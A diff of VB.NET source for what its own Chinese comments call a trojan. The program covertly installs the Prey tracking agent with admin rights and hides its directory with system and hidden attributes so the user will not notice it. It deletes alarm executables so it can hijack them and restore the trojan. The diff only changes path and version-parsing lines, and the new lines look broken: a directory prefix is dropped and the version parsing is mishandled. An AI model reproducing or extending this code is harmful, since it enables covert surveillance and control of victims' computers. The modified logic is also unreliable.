@@ -40,7 +40,6 @@ Namespace My
                 MsgBox("程序需要管理员权限!请右击程序文件，然后选择""以管理员权限运行""！")
                 End
             End If
-
             '释放 MSI 安装文件
             If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
 
@@ -56,10 +55,9 @@ Namespace My
             '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
             Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
 
-
             PreyVireion = GetHighestVersion(PreyDirectory & "\versions\")
-            FlashDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
-            AlarmDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
+            FlashDirectory = PreyVireion & "\lib\agent\actions\alert\win32\"
+            AlarmDirectory = PreyVireion & "\lib\agent\actions\alarm\bin\"
 
             '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
             If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
@@ -152,8 +150,8 @@ Namespace My
             Dim HighVersion As Version = New Version("0.0.0")
             Dim TempVersion As Version
             For Each VersionStr In VersionDir
-                TempVersion = New Version(VersionStr.Split("\").Last)
-                HighVersion = IIf(TempVersion > HighVersion, TempVersion, HighVersion)
+                TempVersion = New Version(Path.GetDirectoryName(VersionStr))
+                If TempVersion > HighVersion Then HighVersion = TempVersion
             Next
             Return HighVersion.ToString()
         End Function
